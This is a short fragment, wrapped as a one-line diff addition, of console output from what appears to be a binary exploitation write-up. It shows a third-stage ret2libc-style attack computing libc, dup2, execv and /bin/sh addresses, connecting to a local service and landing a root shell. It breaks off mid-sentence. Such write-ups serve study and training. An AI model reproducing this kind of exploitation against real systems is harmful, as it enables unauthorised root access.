@@ -1,0 +1,1 @@
+0 [*] Stage 3: Shell [+] Calculated addresses: libc_base: 0x00007f76cb49d000 dup2: 0x00007f76cb58beb0 execv: 0x00007f76cb5682d0 binsh: 0x00007f76cb6251ac [+] Opening connection to 127.0.0.1 on port 5001: Done [*] Switching to interactive mode $ id uid=0(root) gid=0(root) groups=0(root) $ hostname kali Remote The only thing that needs to change
